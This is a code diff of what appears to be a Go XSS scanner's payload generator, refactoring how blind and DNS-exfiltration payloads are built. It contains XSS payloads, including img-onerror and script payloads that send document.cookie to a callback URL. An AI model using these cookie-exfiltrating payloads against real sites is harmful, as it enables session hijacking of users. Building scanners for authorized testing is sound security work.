@@ -34,15 +34,19 @@ type Generator struct {
 	dnsDomain      string // DNS exfil domain (dnslog-style); blind payloads use <marker>.<domain>
 	preset         PayloadPreset
 	customPayloads []Payload // user-provided payloads from wordlist
+	// blindPayloads/dnsPayloads are built once at construction (their inputs
+	// are immutable), avoiding per-injection-point slice rebuilds in Generate.
+	blindPayloads []Payload
+	dnsPayloads   []Payload
 }
 
 // PayloadPreset controls payload volume vs speed tradeoff.
 type PayloadPreset string
 
 const (
-	PresetMinimal  PayloadPreset = "minimal"   // Fast scan: 1-2 payloads per context
-	PresetStandard PayloadPreset = "standard"  // Balanced: all essential payloads
-	PresetFull     PayloadPreset = "full"      // Thorough: all payloads including WAF bypass
+	PresetMinimal  PayloadPreset = "minimal"  // Fast scan: 1-2 payloads per context
+	PresetStandard PayloadPreset = "standard" // Balanced: all essential payloads
+	PresetFull     PayloadPreset = "full"     // Thorough: all payloads including WAF bypass
 )
 
 func NewGenerator() *Generator {
@@ -50,13 +54,21 @@ func NewGenerator() *Generator {
 }
 
 func NewGeneratorWithCallback(callbackURL string) *Generator {
-	return &Generator{callbackURL: callbackURL, preset: PresetStandard}
+	return &Generator{
+		callbackURL:   callbackURL,
+		preset:        PresetStandard,
+		blindPayloads: buildBlindPayloads(callbackURL),
+	}
 }
 
 // NewGeneratorWithDNSCallback creates a generator whose blind payloads point
 // at <marker>.<domain> subdomains (DNS exfil mode for dnslog-style platforms).
 func NewGeneratorWithDNSCallback(domain string) *Generator {
-	return &Generator{dnsDomain: domain, preset: PresetStandard}
+	return &Generator{
+		dnsDomain:   domain,
+		preset:      PresetStandard,
+		dnsPayloads: buildDNSBlindPayloads(domain),
+	}
 }
 
 func (g *Generator) SetPreset(preset PayloadPreset) {
@@ -128,10 +140,10 @@ func (g *Generator) Generate(injection model.InjectionPoint) []Payload {
 	}
 
 	if g.callbackURL != "" {
-		payloads = append(payloads, g.generateBlindPayloads()...)
+		payloads = append(payloads, g.blindPayloads...)
 	}
 	if g.dnsDomain != "" {
-		payloads = append(payloads, g.generateDNSBlindPayloads()...)
+		payloads = append(payloads, g.dnsPayloads...)
 	}
 
 	// Append custom payloads from wordlist — tested only in contexts where
@@ -188,17 +200,16 @@ func (g *Generator) filterTemplates(templates []PayloadTemplate) []PayloadTempla
 	}
 }
 
-// generateDNSBlindPayloads builds blind payloads for DNS exfil mode: each
+// buildDNSBlindPayloads builds blind payloads for DNS exfil mode: each
 // payload requests <xsscan-<rand>>.<domain>, so the dnslog-style platform
 // records a DNS query proving execution. Works even when HTTP egress is
 // blocked — only DNS resolution is needed.
-func (g *Generator) generateDNSBlindPayloads() []Payload {
-	if g.dnsDomain == "" {
+// The caller (cmd) passes a run-unique subdomain prefix so each scan's
+// DNS queries are attributable on dnslog-style platforms.
+func buildDNSBlindPayloads(host string) []Payload {
+	if host == "" {
 		return nil
 	}
-	// The caller (cmd) passes a run-unique subdomain prefix so each scan's
-	// DNS queries are attributable on dnslog-style platforms.
-	host := g.dnsDomain
 	return []Payload{
 		{
 			Value:    fmt.Sprintf(`<img src="http://%s/x">`, host),
@@ -227,13 +238,13 @@ func (g *Generator) generateDNSBlindPayloads() []Payload {
 	}
 }
 
-func (g *Generator) generateBlindPayloads() []Payload {
-	if g.callbackURL == "" {
+func buildBlindPayloads(callbackURL string) []Payload {
+	if callbackURL == "" {
 		return nil
 	}
 	return []Payload{
 		{
-			Value:    fmt.Sprintf(`<script src="%s"></script>`, g.callbackURL),
+			Value:    fmt.Sprintf(`<script src="%s"></script>`, callbackURL),
 			Context:  context.ContextHTMLBody,
 			Type:     PayloadTypeBlind,
 			Score:    0.8,
@@ -241,7 +252,7 @@ func (g *Generator) generateBlindPayloads() []Payload {
 			Severity: model.High,
 		},
 		{
-			Value:    fmt.Sprintf(`<img src=x onerror="fetch('%s?c='+document.cookie)">`, g.callbackURL),
+			Value:    fmt.Sprintf(`<img src=x onerror="fetch('%s?c='+document.cookie)">`, callbackURL),
 			Context:  context.ContextHTMLBody,
 			Type:     PayloadTypeBlind,
 			Score:    0.7,
@@ -249,7 +260,7 @@ func (g *Generator) generateBlindPayloads() []Payload {
 			Severity: model.High,
 		},
 		{
-			Value:    fmt.Sprintf(`<script>new Image().src='%s?cookie='+encodeURIComponent(document.cookie)</script>`, g.callbackURL),
+			Value:    fmt.Sprintf(`<script>new Image().src='%s?cookie='+encodeURIComponent(document.cookie)</script>`, callbackURL),
 			Context:  context.ContextHTMLBody,
 			Type:     PayloadTypeBlind,
 			Score:    0.8,
